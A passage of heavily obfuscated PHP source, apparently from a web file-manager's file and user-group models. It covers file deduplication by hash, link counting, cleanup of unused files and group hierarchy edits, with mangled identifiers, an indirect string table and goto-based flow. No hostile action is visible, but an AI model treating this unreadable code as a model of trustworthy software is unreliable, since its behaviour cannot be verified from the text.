($©‡ÀŒ¶…[$°„Ô†ß[497]] == $°„Ô†ß[91]) { show_json($°„Ô†ß[1440] . $÷¢‡©­Ì, !1); } $¦õ‡â = $this->model->fileInfoGet($÷¢‡©­Ì); $©‡ÀŒ¶…[$°„Ô†ß[184]] = $¦õ‡â[$°„Ô†ß[87]]; $GLOBALS[$°„Ô†ß[183]] = $©‡ÀŒ¶…; IO::fileOutImage($¦õ‡â[$°„Ô†ß[87]], $œé±üÄı); } public function fileOutImage($ÇÓŸî×, $Ù›É›ğÚ = 250) { $this->_fileOutImage($ÇÓŸî×, $Ù›É›ğÚ); } public function fileOutImageServer($ÅìÓûÇò, $Éç‡ä€” = 250) { $this->_fileOutImage($ÅìÓûÇò, $Éç‡ä€”); } public function link($å¬÷…ÓÖ, $×“·Ï’ = '') { $Öû ºÇ² = $this->model->fileInfoGet($å¬÷…ÓÖ); return IO::link($Öû ºÇ²[$_SERVER[ˆö¿ÚÌ¼][87]], $×“·Ï’); } protected function parse($ôÚ•ïŸÜ) { $ò‡Ñ®¨ =& $_SERVER[ˆö¿ÚÌ¼]; if (strstr($ôÚ•ïŸÜ, $ò‡Ñ®¨[8]) === !1) { return array($ò‡Ñ®¨[505] => intval($ôÚ•ïŸÜ), $ò‡Ñ®¨[87] => $ò‡Ñ®¨[12], $ò‡Ñ®¨[1436] => array()); } $ÂÛ…êÇ» = explode($ò‡Ñ®¨[8], trim($ôÚ•ïŸÜ, $ò‡Ñ®¨[8])); if (count($ÂÛ…êÇ») < 2) { show_tips(clear_html($ôÚ•ïŸÜ) . $ò‡Ñ®¨[1441]); } return array($ò‡Ñ®¨[505] => intval($ÂÛ…êÇ»[0]), $ò‡Ñ®¨[87] => $ÂÛ…êÇ»[1], $ò‡Ñ®¨[1436] => array_slice($ÂÛ…êÇ», 1)); } } goto c®Ñ‘¦šÁ; dÇôùõµœ£: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\154\145"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\x65" => "\151\x6f\137\146\151\154\x65\x5f\155\x65\164\141", "\x6d\x65\164\141\x46\151\x65\154\x64" => "\146\151\x6c\145\x49\x44"); public function fileInfo($Ê³±ˆÈ) { $ù„¸¢­ =& $_SERVER[ˆö¿ÚÌ¼]; static $ÔŠôËè = array(); if (!isset($ÔŠôËè[$Ê³±ˆÈ])) { $«Ô“ìÕÅ = $ù„¸¢­[2036]; $ôî»†·÷ = Model($ù„¸¢­[558])->field($«Ô“ìÕÅ)->where(array($ù„¸¢­[556] => $Ê³±ˆÈ))->find(); $ÔŠôËè[$Ê³±ˆÈ] = $ôî»†·÷; } return $ÔŠôËè[$Ê³±ˆÈ]; } public function addFileByContent($°É”·°Ô = '', $§¯åêü­ = '') { $åÜ¬çĞï =& $_SERVER[ˆö¿ÚÌ¼]; $Ëôñ„‰ = TEMP_PATH . $åÜ¬çĞï[2037]; if (!is_dir($Ëôñ„‰)) { mk_dir($Ëôñ„‰); } $˜üÍÎí¼ = $Ëôñ„‰ . $åÜ¬çĞï[2038] . rand_string(16); $£ÏÏ•Õ¥ = file_put_contents($˜üÍÎí¼, $°É”·°Ô); if ($£ÏÏ•Õ¥ === !1 || strlen($°É”·°Ô) != $£ÏÏ•Õ¥) { return !1; } $ëÓå¬¦˜ = $this->addFile($˜üÍÎí¼, $§¯åêü­, !0); if (file_exists($˜üÍÎí¼)) { @unlink($˜üÍÎí¼); } return $ëÓå¬¦˜; } public function createFileName($ğÑûÑàÙ, $òşÎàã = false, $Í³¼Àôï = false) { $ßª§¡®å =& $_SERVER[ˆö¿ÚÌ¼]; $×á†‹Ç = IO::init($ßª§¡®å[8]); $½éù¦™ = $this->makeFilePath($ğÑûÑàÙ, $×á†‹Ç, $òşÎàã, $Í³¼Àôï); $™Œ®Â¦‚ = $×á†‹Ç->pathFather($½éù¦™); static $ºƒîÌœ = false; $¼»ùççñ = $ßª§¡®å[2039] . md5($™Œ®Â¦‚); if (!$ºƒîÌœ && !Cache::get($¼»ùççñ)) { $ºƒîÌœ = !0; $ğ–ÆÀ€ø = IO::mkdir($™Œ®Â¦‚); if (!IO::exist($ğ–ÆÀ€ø . $ßª§¡®å[884])) { IO::mkfile($ğ–ÆÀ€ø . $ßª§¡®å[884]); } Cache::set($¼»ùççñ, 1, 3600 * 2); } return $½éù¦™; } public function makeFilePath($–‚ŒË¯­, $‡Ëşå’, $ØÕª‹Ö´ = false, $À…üë¡ = false) { $’üø¨ˆ¶ =& $_SERVER[ˆö¿ÚÌ¼]; $­Çñª« = Model($’üø¨ˆ¶[855])->get($’üø¨ˆ¶[2040]); $”ôÂŸÇÌ = KodIO::defaultIO() . date($’üø¨ˆ¶[2041]); $çÀµÌ = $”ôÂŸÇÌ . rand_string(5) . short_id(100); $–‚ŒË¯­ = str_replace($’üø¨ˆ¶[8], $’üø¨ˆ¶[11], KodIO::clear($–‚ŒË¯­)); $–¥Âı€ = $‡Ëşå’->ext($–‚ŒË¯­); if (!$–‚ŒË¯­) { $­Çñª« = $’üø¨ˆ¶[861]; } switch ($­Çñª«) { case $’üø¨ˆ¶[2042]: if ($–¥Âı€) { $çÀµÌ = $çÀµÌ . $’üø¨ˆ¶[10] . $–¥Âı€; } if ($–¥Âı€ == $’üø¨ˆ¶[1978]) { $çÀµÌ .= $’üø¨ˆ¶[1305]; } break; case $’üø¨ˆ¶[2043]: $›¬ÜÈ½ˆ = Model($’üø¨ˆ¶[855])->get($’üø¨ˆ¶[856]); $ÇÅí‹Ù† = substr(md5($’üø¨ˆ¶[857] . $›¬ÜÈ½ˆ . date($’üø¨ˆ¶[834])), 0, 8); $§Òë¦‡á = KodIO::defaultDriver(); $”ôÂŸÇÌ = $’üø¨ˆ¶[1336] . $§Òë¦‡á[$’üø¨ˆ¶[478]] . $’üø¨ˆ¶[496] . date($’üø¨ˆ¶[2044]) . $ÇÅí‹Ù† . $’üø¨ˆ¶[8]; if ($–¥Âı€ == $’üø¨ˆ¶[1978]) { $–‚ŒË¯­ .= $’üø¨ˆ¶[1305]; } $åšÔ·† = $’üø¨ˆ¶[2045] . $”ôÂŸÇÌ . $–‚ŒË¯­; CacheLock::lock($åšÔ·†); $çÀµÌ = $”ôÂŸÇÌ . $–‚ŒË¯­; if (IO::exist($”ôÂŸÇÌ . $–‚ŒË¯­)) { $‰¯Ä¦·¥ = substr($–‚ŒË¯­, 0, strlen($–‚ŒË¯­) - strlen($–¥Âı€)); $©©şŸÇÍ = $À…üë¡ ? substr($À…üë¡, 0, 5) : ($ØÕª‹Ö´ ? substr($ØÕª‹Ö´, 0, 5) : rand_string(5)); $çÀµÌ = $”ôÂŸÇÌ . $‰¯Ä¦·¥ . $©©şŸÇÍ; if ($–¥Âı€) { $çÀµÌ = $çÀµÌ . $’üø¨ˆ¶[10] . $–¥Âı€; } } if (IO::isOsDriver($çÀµÌ) && !IO::isUploadServer($çÀµÌ)) { if (IO::exist($çÀµÌ)) { CacheLock::unlock($åšÔ·†); return $çÀµÌ; } $ôĞ“Üİª = IO::setContent($çÀµÌ, $’üø¨ˆ¶[12]); if (!$ôĞ“Üİª) { show_json($’üø¨ˆ¶[2046], !1); } } CacheLock::unlock($åšÔ·†); break; case $’üø¨ˆ¶[861]: break; default: break; } return $çÀµÌ; } public function addFileByRemote($ÔŠÑˆÃû, $Ä¼şñ‡‹, $õãêŞôë = array()) { $³¸˜÷ø£ =& $_SERVER[ˆö¿ÚÌ¼]; if (!IO::exist($ÔŠÑˆÃû)) { return !1; } $ĞÏÜÑ¿ = $õãêŞôë[$³¸˜÷ø£[561]] ? $õãêŞôë[$³¸˜÷ø£[561]] : $³¸˜÷ø£[12]; $Ã›¥Šœú = IO::hashMd5($ÔŠÑˆÃû, $ĞÏÜÑ¿); $«ı´†äÉ = KodIO::defaultDriver(); $úßşé³ñ = array($³¸˜÷ø£[634] => IO::size($ÔŠÑˆÃû), $³¸˜÷ø£[2047] => 1, $³¸˜÷ø£[506] => $Ä¼şñ‡‹, $³¸˜÷ø£[898] => $«ı´†äÉ[$³¸˜÷ø£[478]], $³¸˜÷ø£[507] => $ÔŠÑˆÃû, $³¸˜÷ø£[2048] => $õãêŞôë[$³¸˜÷ø£[689]] ? $õãêŞôë[$³¸˜÷ø£[689]] : IO::hashSimple($ÔŠÑˆÃû), $³¸˜÷ø£[2049] => $Ã›¥Šœú ? $Ã›¥Šœú : $ĞÏÜÑ¿); if ($éâ¯¼¤ = $this->addFileCheckExist($úßşé³ñ[$³¸˜÷ø£[689]], $úßşé³ñ[$³¸˜÷ø£[561]], $úßşé³ñ[$³¸˜÷ø£[79]])) { return $éâ¯¼¤; } return $this->addFileData($úßşé³ñ); } private function addFileData($‡Ëï¦–ı) { $Ò§ô¢Å¸ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$‡Ëï¦–ı) { return !1; } $‡Ëï¦–ı[$Ò§ô¢Å¸[79]] = intval($‡Ëï¦–ı[$Ò§ô¢Å¸[79]]); if (!$‡Ëï¦–ı[$Ò§ô¢Å¸[79]] && strlen($‡Ëï¦–ı[$Ò§ô¢Å¸[689]]) > 32) { $‡Ëï¦–ı[$Ò§ô¢Å¸[79]] = intval(substr($‡Ëï¦–ı[$Ò§ô¢Å¸[689]], 32)); } $½Š³ª°› = $this->add($‡Ëï¦–ı); return $this->find($½Š³ª°›); } public function addFile($€Ã›§£°, $üû¸„ŸÉ, $âÔ«ÂªÓ = false) { $¿îäæ…Ö =& $_SERVER[ˆö¿ÚÌ¼]; $ÖËğğˆ = IO::hashSimple($€Ã›§£°); $³Ô‡Ê­Ø = IO::size($€Ã›§£°); $à‰³ÜÏ = $³Ô‡Ê­Ø <= 1024 * 1024 * 10 ? IO::hashMd5($€Ã›§£°) : $¿îäæ…Ö[12]; $ß­ÚüØ“ = $¿îäæ…Ö[2050] . $ÖËğğˆ; CacheLock::lock($ß­ÚüØ“); if ($à‰³ÜÏ && $ÖËğğˆ) { $œÖäÇŠ§ = $this->addFileCheckExist($ÖËğğˆ, $à‰³ÜÏ, $³Ô‡Ê­Ø); if ($œÖäÇŠ§) { CacheLock::unlock($ß­ÚüØ“); return $œÖäÇŠ§; } } $ÎÉ²áÆ = $this->addFileMake($€Ã›§£°, $³Ô‡Ê­Ø, $ÖËğğˆ, $à‰³ÜÏ, $üû¸„ŸÉ, $âÔ«ÂªÓ); $¿˜÷Ü–Î = $this->addFileData($ÎÉ²áÆ); if (!$¿˜÷Ü–Î) { return !1; } CacheLock::unlock($ß­ÚüØ“); if (!$à‰³ÜÏ && $¿˜÷Ü–Î) { $this->fileMd5Check($¿˜÷Ü–Î); } return $¿˜÷Ü–Î; } public function fileMd5Check($†Ã¹ê®Ø) { $«ÂÌù =& $_SERVER[ˆö¿ÚÌ¼]; $„Å»æÇ = array($†Ã¹ê®Ø[$«ÂÌù[555]], $†Ã¹ê®Ø[$«ÂÌù[87]]); $Ÿõû´ƒÚ = $«ÂÌù[2051] . $†Ã¹ê®Ø[$«ÂÌù[87]]; $ĞÛë˜ = $«ÂÌù[2052] . $†Ã¹ê®Ø[$«ÂÌù[555]]; TaskQueue::add($«ÂÌù[2053], $„Å»æÇ, $Ÿõû´ƒÚ, $ĞÛë˜); } public function fileMd5Set($éŞ®ŞÂ‰, $ûéŸ§ê™) { $æóã™ªŒ =& $_SERVER[ˆö¿ÚÌ¼]; $ô²®÷Á· = $this->find($éŞ®ŞÂ‰); if (!$ô²®÷Á· || $ô²®÷Á·[$æóã™ªŒ[561]]) { return; } $…Ä»ƒšá = IO::hashMd5($ûéŸ§ê™); if (!$…Ä»ƒšá) { return $æóã™ªŒ[12]; } $this->where(array($æóã™ªŒ[555] => $éŞ®ŞÂ‰))->save(array($æóã™ªŒ[561] => $…Ä»ƒšá)); } public function addFileMake($Íû©Ôë, $À‡œù»Ò, $¥Ò®¿‰, $÷‰ùÁİ, $ŒŒ«Ô¹í, $ŒÙæö†) { $â˜Ğäíü =& $_SERVER[ˆö¿ÚÌ¼]; $€ğ’Õ‚â = $this->createFileName($ŒŒ«Ô¹í, $¥Ò®¿‰, $÷‰ùÁİ); $Ó†À³£Ô = get_path_father($€ğ’Õ‚â); $âÇÌ´Ûé = get_path_this($€ğ’Õ‚â); if ($ŒÙæö†) { $÷×«¨óÍ = IO::move($Íû©Ôë, $Ó†À³£Ô, !1, $âÇÌ´Ûé); } else { $÷×«¨óÍ = IO::copy($Íû©Ôë, $Ó†À³£Ô, !1, $âÇÌ´Ûé); } if (!$÷×«¨óÍ) { return !1; } $“ğŒº© = IO::init($÷×«¨óÍ); $“ğŒº©->cacheMethod($â˜Ğäíü[182], $“ğŒº©->path, $â˜Ğäíü[179]); if (IO::size($÷×«¨óÍ) != $À‡œù»Ò) { return !1; } $‘ù«‰‰¨ = KodIO::defaultDriver(); $ÄÊäşÁÎ = array($â˜Ğäíü[634] => $À‡œù»Ò, $â˜Ğäíü[2047] => 1, $â˜Ğäíü[506] => $ŒŒ«Ô¹í, $â˜Ğäíü[898] => $‘ù«‰‰¨[$â˜Ğäíü[478]], $â˜Ğäíü[507] => $€ğ’Õ‚â, $â˜Ğäíü[2048] => $¥Ò®¿‰, $â˜Ğäíü[2049] => $÷‰ùÁİ); return $ÄÊäşÁÎ; } public function addFileCheckExist($²ĞŠ”Íã, $áõÌ¾ÒÕ, $£ó­Ã²ô) { $ñøñšş =& $_SERVER[ˆö¿ÚÌ¼]; $Ş†Œ•· = $this->findByHash($²ĞŠ”Íã, $áõÌ¾ÒÕ); if (!$Ş†Œ•·) { return !1; } $š…•®Å = array($ñøñšş[2047] => intval($Ş†Œ•·[$ñøñšş[2054]]) + 1, $ñøñšş[634] => $£ó­Ã²ô); $this->where(array($ñøñšş[556] => $Ş†Œ•·[$ñøñšş[555]]))->save($š…•®Å); return $Ş†Œ•·; } public function remove($Ã¥‘Ñ×Š) { $this->linkCountChange($Ã¥‘Ñ×Š, !1); $this->clearEmpty(); return !0; } public function linkAdd($óĞ‘¾ç’) { $this->linkCountChange($óĞ‘¾ç’, !0); } public function linkCountChange($Øüø·ÍÀ, $¤ï´ùçõ) { $”ÂÊ©„» =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Øüø·ÍÀ) { return; } if (!is_array($Øüø·ÍÀ)) { $Øüø·ÍÀ = array($Øüø·ÍÀ); } $Úœ’­æ¦ = array(); foreach ($Øüø·ÍÀ as $Üõ¾–³Á) { $ÚÍéĞí = $Üõ¾–³Á . $”ÂÊ©„»[12]; if (!$Úœ’­æ¦[$ÚÍéĞí]) { $Úœ’­æ¦[$ÚÍéĞí] = 0; } $Úœ’­æ¦[$ÚÍéĞí]++; } $¿îÖÒ±¬ = array(); foreach ($Úœ’­æ¦ as $Üõ¾–³Á => $‰­ÛÅœ‚) { $ÚÍéĞí = $‰­ÛÅœ‚ . $”ÂÊ©„»[12]; if (!$¿îÖÒ±¬[$ÚÍéĞí]) { $¿îÖÒ±¬[$ÚÍéĞí] = array(); } $¿îÖÒ±¬[$ÚÍéĞí][] = $Üõ¾–³Á; } foreach ($¿îÖÒ±¬ as $‰­ÛÅœ‚ => $ƒùõÖøÁ) { if (!$ƒùõÖøÁ) { continue; } $‰­ÛÅœ‚ = $¤ï´ùçõ ? $‰­ÛÅœ‚ : -intval($‰­ÛÅœ‚); $åÂı´ëô = array($”ÂÊ©„»[555] => array($”ÂÊ©„»[7], $ƒùõÖøÁ)); if ($‰­ÛÅœ‚ < 0) { $åÂı´ëô[$”ÂÊ©„»[2054]] = array($”ÂÊ©„»[1106], abs($‰­ÛÅœ‚)); } $this->where($åÂı´ëô)->setAdd($”ÂÊ©„»[2054], $‰­ÛÅœ‚); } } public function findByHash($˜¾›Ó€´, $ÊÚ²à¨å = false) { $©²ñ¡çï =& $_SERVER[ˆö¿ÚÌ¼]; if (!$˜¾›Ó€´ && !$ÊÚ²à¨å) { return !1; } $Â¸‚êå = array($©²ñ¡çï[2048] => $˜¾›Ó€´); if ($ÊÚ²à¨å) { $Â¸‚êå = array($©²ñ¡çï[2049] => $ÊÚ²à¨å); } return $this->order($©²ñ¡çï[2055])->where($Â¸‚êå)->find(); } public function clearEmpty($øÏö¹ö = 1) { $‰Ê’ÀÎù =& $_SERVER[ˆö¿ÚÌ¼]; $ŸòîúÅ = time() - 3600 * 24 * $øÏö¹ö; $ùŒì¡Ÿæ = $‰Ê’ÀÎù[2056] . $ŸòîúÅ; $„·¡Íğ“ = $this->where($ùŒì¡Ÿæ)->select(); if (!$„·¡Íğ“) { return; } $ƒŞöõœÆ = new Task($‰Ê’ÀÎù[2057], $‰Ê’ÀÎù[12], count($„·¡Íğ“)); foreach ($„·¡Íğ“ as $±â…ö¥) { $ƒŞöõœÆ->update(1); $this->resetFile($±â…ö¥); } $ƒŞöõœÆ->end(); } public function resetFile($¡»Ğå’ô) { $’ÑÅç¨– =& $_SERVER[ˆö¿ÚÌ¼]; $ï¤—Œ•¨ = array($’ÑÅç¨–[556] => $¡»Ğå’ô[$’ÑÅç¨–[555]]); $«æ«ÔìØ = Model($’ÑÅç¨–[1435])->where($ï¤—Œ•¨)->count(); $ã«¾å´À = Model($’ÑÅç¨–[2058])->where($ï¤—Œ•¨)->count(); $ñ¢å³õè = intval($«æ«ÔìØ) + intval($ã«¾å´À); if ($ñ¢å³õè == 0) { IO::remove($¡»Ğå’ô[$’ÑÅç¨–[87]]); Model($’ÑÅç¨–[2059])->delete($¡»Ğå’ô[$’ÑÅç¨–[555]]); $this->where($ï¤—Œ•¨)->delete(); $this->metaSet($¡»Ğå’ô[$’ÑÅç¨–[555]], null, null); write_log(ACTION . $’ÑÅç¨–[2060] . KodUser::id() . $’ÑÅç¨–[2061] . $¡»Ğå’ô[$’ÑÅç¨–[555]] . $’ÑÅç¨–[2062] . $¡»Ğå’ô[$’ÑÅç¨–[79]] . $’ÑÅç¨–[202] . $¡»Ğå’ô[$’ÑÅç¨–[87]], $’ÑÅç¨–[2063]); return; } if ($¡»Ğå’ô[$’ÑÅç¨–[2054]] != $ñ¢å³õè) { $this->where($ï¤—Œ•¨)->save(array($’ÑÅç¨–[2047] => $ñ¢å³õè)); } } public function storageInfo($¸ìœ‡ü = false) { $ı§¿Æğ” =& $_SERVER[ˆö¿ÚÌ¼]; $ü„÷ÉÈÇ = $this->count() + 0.0; $Ø‰“„ı = 0; $ı§œéıŸ = 1; $óÔØ²öï = 0; $¦Ÿ™«à© = 5000; for ($ôé®Ü•  = 0; $ôé®Ü•  < $ü„÷ÉÈÇ; $ôé®Ü•  = $ôé®Ü•  + $¦Ÿ™«à©) { $ÁèãÇ = $this->limit($ôé®Ü• , $ôé®Ü•  + $¦Ÿ™«à©)->select(); foreach ($ÁèãÇ as $Ò¶‚œ¦) { $ı§œéıŸ += $Ò¶‚œ¦[$ı§¿Æğ”[79]] * $Ò¶‚œ¦[$ı§¿Æğ”[2054]]; $Ø‰“„ı += $Ò¶‚œ¦[$ı§¿Æğ”[79]] * ($Ò¶‚œ¦[$ı§¿Æğ”[2054]] - 1); $óÔØ²öï += $Ò¶‚œ¦[$ı§¿Æğ”[2054]]; } } $§ò™µù† = array($ı§¿Æğ”[2064] => $ı§œéıŸ, $ı§¿Æğ”[2065] => $Ø‰“„ı, $ı§¿Æğ”[2066] => $Ø‰“„ı / $ı§œéıŸ, $ı§¿Æğ”[83] => $ü„÷ÉÈÇ, $ı§¿Æğ”[2067] => $óÔØ²öï); return $§ò™µù†; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\x65" => "\147\x72\x6f\165\160\137\155\145\x74\x61", "\155\x65\x74\141\x46\x69\145\x6c\144" => "\x67\x72\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($£©ÈÑÃè) { $¶–ô”Íç =& $_SERVER[ˆö¿ÚÌ¼]; return array($¶–ô”Íç[2068] => array($£©ÈÑÃè[0], $¶–ô”Íç[2069]), $¶–ô”Íç[2070] => array($£©ÈÑÃè[0], $¶–ô”Íç[2071])); } protected function getInfo($ş±éæÂ¸, $ù±‡ğ› = false) { $”ºõşìŒ = $this->getInfoSimple($ş±éæÂ¸); if (!$”ºõşìŒ) { return !1; } if ($ù±‡ğ›) { return $this->_listDataApplyItem($”ºõşìŒ); } return $this->cacheFunctionGet($_SERVER[ˆö¿ÚÌ¼][2072], $ş±éæÂ¸); } protected function getInfoSimple($Éˆá¹ß, $ø¼Ã‘ßú = false) { $«ïèøÔ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ø¼Ã‘ßú) { $÷«†Ûê· = array($«ïèøÔ[1986] => intval($Éˆá¹ß)); $º°€çŒ³ = $this->where($÷«†Ûê·)->find(); return is_array($º°€çŒ³) ? $º°€çŒ³ : array(); } return $this->cacheFunctionGet($«ïèøÔ[2073], $Éˆá¹ß); } protected function groupAdd($óÃàí™ƒ) { $ãëïÌ¡• =& $_SERVER[ˆö¿ÚÌ¼]; if (!$óÃàí™ƒ[$ãëïÌ¡•[193]] && isset($óÃàí™ƒ[$ãëïÌ¡•[1986]]) && $óÃàí™ƒ[$ãëïÌ¡•[1986]] == 1) { if ($¡¼—¼ü = $this->getInfoSimple($óÃàí™ƒ[$ãëïÌ¡•[1986]], !0)) { return $óÃàí™ƒ[$ãëïÌ¡•[1986]]; } } else { $¡¼—¼ü = $this->getInfoSimple($óÃàí™ƒ[$ãëïÌ¡•[193]]); if (!$¡¼—¼ü) { return !1; } } $¸ë²çé˜ = $ãëïÌ¡•[607]; if ($¡¼—¼ü[$ãëïÌ¡•[598]]) { $¸ë²çé˜ = $¡¼—¼ü[$ãëïÌ¡•[598]] . $¡¼—¼ü[$ãëïÌ¡•[1986]] . $ãëïÌ¡•[50]; } $²·ˆÀÊ« = array($ãëïÌ¡•[506] => $this->groupNameAuto($óÃàí™ƒ[$ãëïÌ¡•[193]], $óÃàí™ƒ[$ãëïÌ¡•[32]]), $ãëïÌ¡•[489] => $óÃàí™ƒ[$ãëïÌ¡•[193]], $ãëïÌ¡•[669] => $¸ë²çé˜, $ãëïÌ¡•[2074] => $óÃàí™ƒ[$ãëïÌ¡•[1972]], $ãëïÌ¡•[2075] => 0, $ãëïÌ¡•[1990] => 0); if (isset($óÃàí™ƒ[$ãëïÌ¡•[2010]])) { $²·ˆÀÊ«[$ãëïÌ¡•[2010]] = $óÃàí™ƒ[$ãëïÌ¡•[2010]]; } else { $«ê¥¥ÊŞ = $this->max($ãëïÌ¡•[2010]); if (!$«ê¥¥ÊŞ) { $«ê¥¥ÊŞ = 0; } $²·ˆÀÊ«[$ãëïÌ¡•[2010]] = $«ê¥¥ÊŞ + 1; } if (!empty($óÃàí™ƒ[$ãëïÌ¡•[1986]])) { $²·ˆÀÊ«[$ãëïÌ¡•[1986]] = $óÃàí™ƒ[$ãëïÌ¡•[1986]]; } $€Éá¡õ‹ = $this->add($²·ˆÀÊ«); $this->setNamePinyin($€Éá¡õ‹, $²·ˆÀÊ«[$ãëïÌ¡•[32]]); if (isset($óÃàí™ƒ[$ãëïÌ¡•[2076]])) { $this->metaSet($€Éá¡õ‹, array($ãëïÌ¡•[2076] => $óÃàí™ƒ[$ãëïÌ¡•[2076]], $ãëïÌ¡•[2077] => $óÃàí™ƒ[$ãëïÌ¡•[2077]])); unset($óÃàí™ƒ[$ãëïÌ¡•[2076]]); unset($óÃàí™ƒ[$ãëïÌ¡•[2077]]); } Model($ãëïÌ¡•[1435])->groupRootAdd($€Éá¡õ‹); $this->_clearCache($óÃàí™ƒ[$ãëïÌ¡•[193]]); return $€Éá¡õ‹; } protected function groupEdit($À¤Ç©, $Ö˜½µ) { $˜ÁÉßí =& $_SERVER[ˆö¿ÚÌ¼]; $ŸÚÈó‰° = $this->getInfoSimple($À¤Ç©); if (!$ŸÚÈó‰°) { return !1; } if (!empty($Ö˜½µ[$˜ÁÉßí[193]])) { $‡Ë°§ƒ = $this->getInfoSimple($Ö˜½µ[$˜ÁÉßí[193]]); if (!$‡Ë°§ƒ) { return !1; } if ($ŸÚÈó‰°[$˜ÁÉßí[1986]] == $‡Ë°§ƒ[$˜ÁÉßí[1986]]) { return !1; } if ($Ö˜½µ[$˜ÁÉßí[193]] != $ŸÚÈó‰°[$˜ÁÉßí[193]]) { if ($‡Ë°§ƒ[$˜ÁÉßí[598]] !== $ŸÚÈó‰°[$˜ÁÉßí[598]] && strpos($‡Ë°§ƒ[$˜ÁÉßí[598]], $ŸÚÈó‰°[$˜ÁÉßí[598]] . $ŸÚÈó‰°[$˜ÁÉßí[1986]] . $˜ÁÉßí[50]) === 0) { return !1; } $Ö˜½µ[$˜ÁÉßí[669]] = $‡Ë°§ƒ[$˜ÁÉßí[598]] . $Ö˜½µ[$˜ÁÉßí[193]] . $˜ÁÉßí[50]; $this->_changeChildLevel($ŸÚÈó‰°, $‡Ë°§ƒ); $this->_clearCache($‡Ë°§ƒ[$˜ÁÉßí[1986]]); $this->_clearCache($ŸÚÈó‰°[$˜ÁÉßí[193]]); } } if (isset($Ö˜½µ[$˜ÁÉßí[32]])) { $this->setNamePinyin($À¤Ç©, $Ö˜½µ[$˜ÁÉßí[32]]); } if (isset($Ö˜½µ[$˜ÁÉßí[2076]])) { $this->metaSet($À¤Ç©, array($˜ÁÉßí[2076] => $Ö˜½µ[$˜ÁÉßí[2076]], $˜ÁÉßí[2077] => $Ö˜½µ[$˜ÁÉßí[2077]])); unset($Ö˜½µ[$˜ÁÉßí[2076]]); unset($Ö˜½µ[$˜ÁÉßí[2077]]); } $this->_clearChildrenCache($ŸÚÈó‰°); return $this->where(array($˜ÁÉßí[2078] => $À¤Ç©))->save($Ö˜½µ); } private function _clearChildrenCache($Ã¹ò‹İÚ) { $ş¤èİª… =& $_SERVER[ˆö¿ÚÌ¼]; $È°šî®½ = array($ş¤èİª…[669] => array($ş¤èİª…[629], $Ã¹ò‹İÚ[$ş¤èİª…[598]] . $Ã¹ò‹İÚ[$ş¤èİª…[1986]] . $ş¤èİª…[630])); $ß¹Œ¿œ¿ = $this->field($ş¤èİª…[1986])->where($È°šî®½)->select(); foreach ($ß¹Œ¿œ¿ as $µ›à³ÃÁ) { $this->_clearCache($µ›à³ÃÁ[$ş¤èİª…[1986]]); } } private function _clearCache($Õ†¨å) { $Ù–ÓÈã˜ =& $_SERVER[ˆö¿ÚÌ¼]; $this->cacheFunctionClear($Ù–ÓÈã˜[2072], $Õ†¨å); $this->cacheFunctionClear($Ù–ÓÈã˜[2073], $Õ†¨å); } private function _changeChildLevel($×ş–†®ú, $Ğ½š»¯, $ÍåÁ†™ = false) { $äå¿¸Êí =& $_SERVER[ˆö¿ÚÌ¼]; $şÈó = $×ş–†®ú[$äå¿¸Êí[598]] . $×ş–†®ú[$äå¿¸Êí[1986]] . $äå¿¸Êí[50]; $Şì¥Î¿ = $Ğ½š»¯[$äå¿¸Êí[598]] . $Ğ½š»¯[$äå¿¸Êí[1986]] . $äå¿¸Êí[50] . $×ş–†®ú[$äå¿¸Êí[1986]] . $äå¿¸Êí[50]; if ($ÍåÁ†™) { $Şì¥Î¿ = $Ğ½š»¯[$äå¿¸Êí[598]] . $Ğ½š»¯[$äå¿¸Êí[1986]] . $äå¿¸Êí[50]; } $Øğİ…ÔÄ = array($äå¿¸Êí[669] => array($äå¿¸Êí[629], $×ş–†®ú[$äå¿¸Êí[598]] . $×ş–†®ú[$äå¿¸Êí[1986]] . $äå¿¸Êí[630])); $§ôÚ¶Í• = array($äå¿¸Êí[669] => array($äå¿¸Êí[678], "\162\145\160\x6c\x61\x63\x65\x28\x70\141\162\145\156\x74\x4c\145\x76\x65\154\54\x27{$şÈó}\x27\54\x27{$Şì¥Î¿}\47\x29")); $this->_clearChildrenCache($×ş–†®ú); $this->where($Øğİ…ÔÄ)->data($§ôÚ¶Í•)->save(); } public function setNamePinyin($±¡Ãé¬Û, $Ûº½‚—Í = false) { $²Ó‹Òœ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Ûº½‚—Í) { $Ï„æ®õ = $this->getInfoSimple($±¡Ãé¬Û); $Ûº½‚—Í = $Ï„æ®õ[$²Ó‹Òœ[32]]; } if (!Input::check($Ûº½‚—Í, $²Ó‹Òœ[672])) { $this->metaSet($±¡Ãé¬Û, $²Ó‹Òœ[550], null); $this->metaSet($±¡Ãé¬Û, $²Ó‹Òœ[549], null); return; } $ñĞèë¬¾ = array($²Ó‹Òœ[550] => str_replace($²Ó‹Òœ[53], $²Ó‹Òœ[12], Pinyin::get($Ûº½‚—Í)), $²Ó‹Òœ[549] => Pinyin::get($Ûº½‚—Í, $²Ó‹Òœ[673])); $this->metaSet($±¡Ãé¬Û, $ñĞèë¬¾); } protected function metaSet($´®Í»®ü, $ËİÊ¢š– = null, $É¬Çó— = null) { $this->_clearCache($´®Í»®ü); return parent::metaSet($´®Í»®ü, $ËİÊ¢š–, $É¬Çó—); } protected function groupStatus($ã¶ãÅß´, $áÕàÊÖÏ) { $§»“»Ôê =& $_SERVER[ˆö¿ÚÌ¼]; $ø•„Ìïâ = $this->getInfoSimple($ã¶ãÅß´); if (!$ø•„Ìïâ) { return !1; } $this->_clearCache($ã¶ãÅß´); return $this->metaSet($ã¶ãÅß´, $§»“»Ôê[835], $áÕàÊÖÏ); if ($áÕàÊÖÏ == $§»“»Ôê[91]) { $€º¾åèÑ = $this->parentLevelArray($ø•„Ìïâ[$§»“»Ôê[598]]); } else { } $€º¾åèÑ[] = $ø•„Ìïâ[$§»“»Ôê[1986]]; $ğ¨ğ†íè = array(); foreach ($€º¾åèÑ as $ã¶ãÅß´) { $ğ¨ğ†íè[] = array($§»“»Ôê[1986] => $ã¶ãÅß´, $§»“»Ôê[97] => $§»“»Ôê[835], $§»“»Ôê[453] 